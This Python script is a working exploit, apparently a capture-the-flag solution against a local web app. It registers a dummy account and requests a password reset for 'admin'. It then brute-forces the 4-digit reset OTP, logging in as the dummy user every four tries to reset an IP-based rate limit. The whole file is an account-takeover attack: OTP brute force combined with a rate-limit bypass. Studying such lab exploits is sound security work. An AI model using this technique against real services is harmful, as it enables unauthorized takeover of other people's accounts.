import requests
import time

url = "http://localhost:1337/"

# Register a dummy user
requests.post(
    f"{url}register",
    data={
        "username": "test",
        "password": "test",
    },
)
# send password reset request for admin
requests.post(
    f"{url}forgot_password",
    data={"username": "admin"},
)

# Brute force the OTP, and reset the password
# The OTP is a 4 digit number
# The OTP is between 1000 and 10000
# To make the brute force faster, we can use the rate limit bypass vulnerability
# The rate limit is based on the IP address
# The rate limit is 5 attempts
# After 5 attempts, the user will be rate limited
# But if the user (IP) makes a successful login, the rate limit will be reset to 0 attempts and the user can try again
c = 0
for i in range(1000, 10000):
    c += 1
    start_time = time.time()
    data = {"username": "admin", "new_password": "admin", "otp": i}

    r = requests.post(f"{url}reset_password", data=data)

    # print(f"OTP: {i}")

    if "invalid!" not in r.text:
        print(r.text)
        print(f"OTP: {i}")
        print(f"Time: {time.time() - start_time}")
        exit()

    if c == 4:
        requests.post(
            f"{url}login",
            data={"username": "test", "password": "test"},
        )
        c = 0
